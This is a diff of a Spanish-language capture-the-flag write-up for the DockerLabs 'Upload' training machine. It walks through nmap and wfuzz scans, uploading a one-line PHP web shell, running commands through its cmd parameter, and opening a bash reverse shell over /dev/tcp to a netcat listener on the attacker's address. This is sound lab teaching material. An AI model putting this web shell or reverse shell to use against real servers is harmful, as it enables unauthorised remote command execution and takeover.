@@ -1,8 +1,9 @@
-![image](https://github.com/Crisstianpd/CTFs/blob/13e06aa9608e2ab7b5a6bc12b876802724de4e3a/DockerLabs/Easy/Upload/imgs/banner.png)
+![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-banner.png)
 
 [Dockerlabs](https://dockerlabs.es/)
 
 ## Reconocimiento
+
 Comenzamos con un escaneo de nmap a todos los puertos de la maquina vulnerable en busca de puertos abiertos.
 
 ```shell
@@ -15,6 +16,7 @@ PORT   STATE SERVICE REASON
 
 El puerto 80 corresponde a un servicio de http(Hyper Text Transfer Protocol) o servicio web en pocas palabras.
 Ahora hacemos un escaneo sobre el unico puerto que se encuentra abierto(puerto 80) con un conjunto de scripts basicos de reconocimiento que trae por defecto nmap.
+
 ```shell
 nmap -p80 -sCV 172.17.0.2 -oN targeted
 ______________________________________
@@ -23,6 +25,59 @@ PORT   STATE SERVICE VERSION
 |_http-title: Upload here your file
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 ```
-Guiandonos por el escaneo podemos obersvar que probablemente nos encontraremos con la oportunidad de subir archivos al servidor desde una web especifica para ello.
-Es hora de visualizar la pagina web.
+Guiandonos por el escaneo podemos ver que dentro del puerto 80 se aloja una pagina web que tal parece nos dejara subir archivos a la maquina.
+Hora de visualizar la pagina web.
+
+![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-img1.png)
+
+Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo php con el que podamos ejecutar comandos atraves de un paramentro. Y es justo lo que haremos.
+```shell
+echo "<?php system(\$_GET['cmd']); ?>" >> test.php
+```
+
+Despues de crear el archivo lo subiremos a la web. Y ahora tenemos que encontrar la ruta en donde se asubido nuestro archivo.
+
+Para ello, haremos uso de wfuzz para buscar esa ruta o directorio en donde deberia estar nuestro archivo test.php.
+
+```shell
+wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://172.17.0.2/FUZZ
+________________________________________________________________________________________________________________
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://172.17.0.2/FUZZ
+Total requests: 1273832
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+000000001:   200        53 L     104 W      1361 Ch     "# directory-list-2.3-big.txt"
+...
+000000164:   301        9 L      28 W       310 Ch      "uploads"
+```
+
+Si revisamos el directorio que nos ha econtrado llamado "uploads", podremos oberservar que ahi se encuntra alojado nuestro archivo test.php.
+
+![image]()
+
+Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un llamado al parametro que predefinimos anteriormente para que ejecute el comando "id" en la maquina.
+
+```
+http://172.17.0.2/uploads/test.php?cmd=id
+```
+
+![image]()
+Al hacer esto podremos observar la respuesta del servidor ante el comando "id" por lo que el archivo funciona y el servidor interpreta de forma correcta las peticiones hechas atraves del archivo php. Sabiendo esto, podemos intentar entablar una revershell del servidor a nuestra maquina atacante. 
+
+Nos colocamos en escucha con netcat por el puerto 443.
+```shell
+nc -nlvp 443
+```
+Y hacemos la siguiente peticion cambiando el "&" por su expresion en URL, un %26, para que pueda ser interpretado por el servidor:
+```shell
+http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
+```
+![image]()
+Y hemos logrado ganar acceso al servidor.
 
